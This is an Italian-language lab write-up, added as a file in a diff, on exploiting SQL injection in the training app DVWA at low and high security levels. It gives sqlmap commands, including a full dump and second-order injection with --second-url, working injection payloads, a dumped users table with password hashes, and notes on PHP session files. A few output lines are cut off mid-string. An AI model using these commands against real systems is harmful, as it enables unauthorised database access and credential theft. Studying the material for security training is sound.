@@ -1,0 +1,196 @@
+#+TITLE: DVWA – SQLi
+#+AUTHOR: Leonardo Tamiano
+
+
+* SQLi High
+  Prima di effettuare il livello hard vediamo come utilizzare ~sqlmap~
+  nel livello ~easy~. A tale fine attiviamo il proxy e catturiamo la
+  richiesta che viene effettuata
+
+  ----------------
+   
+  #+begin_example
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: evil.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=low; PHPSESSID=l1vgsbhkufl414bik8iifrc91m
+Connection: close
+  #+end_example
+
+  ----------------
+  
+  Tramite burp la possiamo salvare in un file con (tasto destro ->
+  save item) e possiamo poi chiamare ~sqlmap~ come segue
+
+  #+begin_src sh
+sqlmap -r sql_easy_request.xml    
+  #+end_src
+
+  Dopo un po' di tempo, otteniamo il seguente output
+
+  ----------------
+
+  #+begin_example
+sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 9464=9464#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 8635 FROM(SELECT COUNT(*),CONCAT(0x7178707671,(SELECT (ELT(8635=8635,1))),0x7170707a71,FLOOR(RAND(0)*2))x FROMS GROUP BY x)a)-- ZnFP&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 8713 FROM (SELECT(SLEEP(5)))WCBw)-- mmPl&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x4c594d43454244515472616c757677727a4350434f6744785952544d6d59666f535379456f7361ubmit   
+  #+end_example
+
+  ----------------
+  
+  Se poi vogliamo estrapolare tutti i dati di interesse, possiamo
+  effettuare il seguente comando
+
+  #+begin_src sh
+sqlmap -r sql_easy_request.xml --dump   
+  #+end_src
+   
+  otteniamo quindi le seguenti due tabelle
+
+  ----------------
+
+  #+begin_example
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+----------------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                           | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+----------------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2022-07-23 17:52:48 | 0            |
+| 2       | gordonb | /dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2022-07-23 17:52:48 | 0            |
+| 3       | 1337    | /dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2022-07-23 17:52:48 | 0            |
+| 4       | pablo   | /dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2022-07-23 17:52:48 | 0            |
+| 5       | smithy  | /dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2022-07-23 17:52:48 | 0            |
++---------+---------+----------------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+------+-------------------------+
+| comment_id | name | comment                 |
++------------+------+-------------------------+
+| 1          | test | This is a test comment. |
++------------+------+-------------------------+   
+
+  #+end_example
+
+  ----------------
+  
+  Nel livello ~hard~ però sqlmap non sembra più funzionare, in quanto
+  se catturiamo la richiesta all'endpoint ~session-input.php~ otteniamo
+  il seguente risultato
+   
+  #+begin_example
+POST /dvwa/vulnerabilities/sqli/session-input.php HTTP/1.1
+Host: evil.com
+Content-Length: 18
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/session-input.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=high; PHPSESSID=l1vgsbhkufl414bik8iifrc91m
+Connection: close
+
+id=1&Submit=Submit   
+  #+end_example
+   
+  #+begin_src sh
+sqlmap -r sql_high_request.xml   
+  #+end_src
+
+  #+begin_example
+[16:01:30] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'- you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option itch '--random-agent'   
+  #+end_example
+
+  Il problema è che questo tipo di injection è una sql injection con
+  una ~second-order response~, nel senso che l'output associati al
+  payload non è mostrato direttamente ma bisogna effettuare una
+  seconda richiesta ad un altro endpoint.
+   
+  #+begin_example
+payload con sqli ---> endpoint #1 ---> cambio stato interno + output inutile
+richiesta        ---> endpoint #2 ---> output del payload di prima
+  #+end_example
+
+  In questo casi possiamo utilizzare la flag ~--second-url~ offerta da ~sqlmap~
+
+  #+begin_src sh
+sqlmap -r sql_high_request.xml --second-url=http://evil.com/dvwa/vulnerabilities/sqli/index.php    
+  #+end_src
+
+  Così facendo otteniamo nuovamente che il parametro ~id~ è vulnerabile
+  ad una sqli
+   
+  #+begin_example
+POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 2900 FROM (SELECT(SLEEP(5)))dCcN) AND 'TAXB'='TAXB&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716b627671,0x68726c704c457854584679595a574967416d6d526a7761717659
+t=Submit
+---   
+  #+end_example
+
+  E riusciamo a dumpare le informazioni del db come abbiamo fatto
+  precedentemente.
+
+* EXTRA: Come vengono salvate le variabili di sessione in php?
+
+  #+begin_src php
+$_SESSION[ 'id' ] =  $_POST[ 'id' ]; # scrivere variabile di sessione
+# ...
+$id = $_SESSION[ 'id' ];             # scrivere variabile di sessione
+  #+end_src
+
+  Nel file ~/etc/php/7.3/apache2/php.ini~ è presente l'entry
+  ~session.save_path~ che punta al path ~/var/lib/php/sessions~. In
+  questa cartella sono salvati una serie di file
+   
+  #+begin_example
+root@kali:/var/lib/php/sessions# ls
+sess_omegr89sf6f8t3jmkj9s7aqr5o   
+  #+end_example
+
+  e il formato di questi file è sempre ~sess_<COOKIE_ID>~. Il contenuto
+  di questo file contiene una struttura dati php serializzata, e
+  questa struttura dati contiene tutte le variabili di sessione
+   
+  #+begin_example
+root@kali:/var/lib/php/sessions# cat sess_omegr89sf6f8t3jmkj9s7aqr5o
+dvwa|a:2:{s:8:"messages";a:0:{}s:8:"username";s:5:"admin";}id|s:1:"3";session_token|s:32:"81a6949061570eabafcf23194d58a628";   
+  #+end_example
+
+  Notiamo che è presente anche il valore del campo ~id~. Modificando
+  quel valore siamo in grado di cambiare l'output nella relativa
+  pagina dell'applicazione.
